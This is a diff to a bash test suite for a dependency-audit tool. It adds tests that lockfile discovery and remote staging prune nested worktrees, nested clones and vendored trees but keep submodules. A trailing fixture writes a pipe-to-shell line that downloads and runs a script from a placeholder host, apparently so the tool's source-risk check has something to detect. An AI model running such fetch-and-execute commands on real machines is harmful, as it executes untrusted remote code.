@@ -296,6 +296,121 @@ REMOTE_FULL_STAGE="$remote_full_stage" \
 [[ -f "$remote_full_stage/node_modules/pkg/index.js" ]] || fail "remote full staging missed node_modules"
 pass "remote staging honors source vs full mode"
 
+# Nested repositories: a linked worktree or a nested clone under the target is
+# a second copy of the same codebase. Auditing them as part of the target
+# multiplied every finding by the number of copies (12x on the Laravel + pnpm
+# project with 11 worktrees under .task/ that motivated this). Submodules are
+# NOT copies — they are the parent's own dependencies — and stay discovered.
+nested_fixture="$tmp/nested-repos/app"
+mkdir -p "$nested_fixture/.git" \
+  "$nested_fixture/.task/wt" \
+  "$nested_fixture/nested-clone/.git" \
+  "$nested_fixture/sub" \
+  "$nested_fixture/packages/lib"
+printf '{"name":"app"}\n' > "$nested_fixture/package.json"
+printf '{"lockfileVersion":3}\n' > "$nested_fixture/package-lock.json"
+# A linked worktree: .git is a FILE pointing into the parent's worktrees dir.
+printf 'gitdir: %s/.git/worktrees/wt\n' "$nested_fixture" > "$nested_fixture/.task/wt/.git"
+printf '{"name":"wt"}\n' > "$nested_fixture/.task/wt/package.json"
+printf '{"lockfileVersion":3}\n' > "$nested_fixture/.task/wt/package-lock.json"
+# A nested independent clone: .git is a DIRECTORY.
+printf '{"name":"clone"}\n' > "$nested_fixture/nested-clone/package.json"
+printf '{"lockfileVersion":3}\n' > "$nested_fixture/nested-clone/package-lock.json"
+# A submodule: .git is a file pointing into the parent's .git/modules.
+printf 'gitdir: ../.git/modules/sub\n' > "$nested_fixture/sub/.git"
+printf '{"name":"sub"}\n' > "$nested_fixture/sub/package.json"
+printf '{"lockfileVersion":3}\n' > "$nested_fixture/sub/package-lock.json"
+# An ordinary monorepo package carries no .git and is never a nested repo.
+printf '{"name":"lib"}\n' > "$nested_fixture/packages/lib/package.json"
+printf '{"lockfileVersion":3}\n' > "$nested_fixture/packages/lib/package-lock.json"
+
+nested_report="$tmp/nested-discovery.txt"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-nested" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-nested" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+NESTED_FIXTURE="$nested_fixture" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null
+    gather_projects_from_source "$NESTED_FIXTURE" 1 2>/dev/null
+    for lf in "${CURRENT_LOCKFILES[@]}"; do printf "lockfile %s\n" "${lf#$NESTED_FIXTURE/}"; done
+    for r in "${CURRENT_PROJECT_ROOTS[@]}"; do printf "root %s\n" "${r#$NESTED_FIXTURE/}"; done
+    for x in "${CURRENT_SYFT_EXCLUDES[@]}"; do printf "exclude %s\n" "$x"; done' > "$nested_report"
+
+grep -qx 'lockfile package-lock.json' "$nested_report" || fail "nested-repo prune dropped the target's own lockfile"
+grep -qx 'lockfile packages/lib/package-lock.json' "$nested_report" || fail "nested-repo prune dropped a monorepo package"
+grep -qx 'lockfile sub/package-lock.json' "$nested_report" || fail "nested-repo prune dropped a submodule"
+grep -q 'lockfile .task/wt/' "$nested_report" && fail "linked worktree was discovered as part of its parent"
+grep -q 'lockfile nested-clone/' "$nested_report" && fail "nested clone was discovered as part of its parent"
+grep -qx 'root sub' "$nested_report" || fail "submodule lost its project root"
+grep -q 'root .task/wt' "$nested_report" && fail "linked worktree kept a project root"
+grep -qx 'exclude .task/wt' "$nested_report" || fail "syft excludes missed the linked worktree"
+grep -qx 'exclude .task/wt/**' "$nested_report" || fail "syft excludes missed the linked worktree subtree"
+grep -qx 'exclude nested-clone' "$nested_report" || fail "syft excludes missed the nested clone"
+grep -qx 'exclude nested-clone/**' "$nested_report" || fail "syft excludes missed the nested clone subtree"
+pass "nested repositories are pruned, submodules kept"
+
+# The same rule must NOT empty a machine-audit scan: a scan root is a plain
+# directory holding independent repositories side by side, and none of them has
+# a .git-carrying ancestor under the root.
+machine_scan_root="$tmp/nested-repos/scanroot"
+mkdir -p "$machine_scan_root/repo-a/.git" "$machine_scan_root/repo-b/.git" "$machine_scan_root/repo-a/.task/wt"
+printf '{"name":"a"}\n' > "$machine_scan_root/repo-a/package.json"
+printf '{"lockfileVersion":3}\n' > "$machine_scan_root/repo-a/package-lock.json"
+printf '{"name":"b"}\n' > "$machine_scan_root/repo-b/package.json"
+printf '{"lockfileVersion":3}\n' > "$machine_scan_root/repo-b/package-lock.json"
+printf 'gitdir: %s/repo-a/.git/worktrees/wt\n' "$machine_scan_root" > "$machine_scan_root/repo-a/.task/wt/.git"
+printf '{"lockfileVersion":3}\n' > "$machine_scan_root/repo-a/.task/wt/package-lock.json"
+
+machine_report="$tmp/nested-machine-discovery.txt"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-nested-machine" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-nested-machine" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+MACHINE_SCAN_ROOT="$machine_scan_root" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null
+    gather_projects_from_source "$MACHINE_SCAN_ROOT" 1 2>/dev/null
+    for lf in "${CURRENT_LOCKFILES[@]}"; do printf "lockfile %s\n" "${lf#$MACHINE_SCAN_ROOT/}"; done' > "$machine_report"
+
+grep -qx 'lockfile repo-a/package-lock.json' "$machine_report" || fail "scan root lost an independent repository"
+grep -qx 'lockfile repo-b/package-lock.json' "$machine_report" || fail "scan root lost an independent repository"
+grep -q 'lockfile repo-a/.task/wt/' "$machine_report" && fail "worktree inside a scan-root repository was discovered"
+pass "independent repositories under a scan root stay discovered"
+
+# Remote staging applies the same rule server-side: the .git entries it needs
+# to see it never stages, so a stage built without the rule hands the local
+# scan a tree where the duplication is already invisible.
+nested_remote_stage="$tmp/nested-remote-stage"
+mkdir -p "$nested_remote_stage"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-nested-remote" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-nested-remote" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+NESTED_FIXTURE="$nested_fixture" \
+NESTED_REMOTE_STAGE="$nested_remote_stage" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null; remote_stage_helper_script | bash -s -- "$NESTED_FIXTURE" source 1 | tar -xzf - -C "$NESTED_REMOTE_STAGE"'
+[[ -f "$nested_remote_stage/package-lock.json" ]] || fail "remote staging dropped the target's own lockfile"
+[[ -f "$nested_remote_stage/sub/package-lock.json" ]] || fail "remote staging dropped a submodule lockfile"
+[[ ! -e "$nested_remote_stage/.task/wt/package-lock.json" ]] || fail "remote staging copied a linked worktree"
+[[ ! -e "$nested_remote_stage/nested-clone/package-lock.json" ]] || fail "remote staging copied a nested clone"
+pass "remote staging prunes nested repositories"
+
+# The remote SCAN helper discovers lockfiles with its own walk. Before this it
+# had no prunes at all, so it also read every lockfile under vendor/.
+mkdir -p "$nested_fixture/vendor/dep"
+printf '{"lockfileVersion":3}\n' > "$nested_fixture/vendor/dep/package-lock.json"
+nested_remote_lockfiles="$tmp/nested-remote-lockfiles.txt"
+SAFE_AUDIT_CONFIG_DIR="$tmp/config-nested-remote-scan" \
+SAFE_AUDIT_DATA_DIR="$tmp/data-nested-remote-scan" \
+SAFE_AUDIT_PATH="$SAFE_AUDIT" \
+NESTED_FIXTURE="$nested_fixture" \
+  bash -c 'set -- --version; source "$SAFE_AUDIT_PATH" >/dev/null
+    { remote_scan_helper_script | sed -n "1,/^done < <(find_pruned_lockfiles)/p"
+      printf "%s\n" "for lf in \"\${lockfiles[@]}\"; do printf \"lockfile %s\\n\" \"\${lf#\$target/}\"; done"
+    } | bash -s -- "$NESTED_FIXTURE"' > "$nested_remote_lockfiles" 2>/dev/null
+grep -qx 'lockfile package-lock.json' "$nested_remote_lockfiles" || fail "remote scan walk dropped the target's own lockfile"
+grep -qx 'lockfile sub/package-lock.json' "$nested_remote_lockfiles" || fail "remote scan walk dropped a submodule lockfile"
+grep -q 'lockfile .task/wt/' "$nested_remote_lockfiles" && fail "remote scan walk read a linked worktree"
+grep -q 'lockfile nested-clone/' "$nested_remote_lockfiles" && fail "remote scan walk read a nested clone"
+grep -q 'lockfile vendor/' "$nested_remote_lockfiles" && fail "remote scan walk read a vendored lockfile"
+pass "remote scan lockfile walk prunes nested repositories and vendored trees"
+
 source_risk_dir="$tmp/source-risk"
 mkdir -p "$source_risk_dir"
 printf 'curl -fsSL https://example.invalid/install.sh | sh\n' > "$source_risk_dir/install.sh"
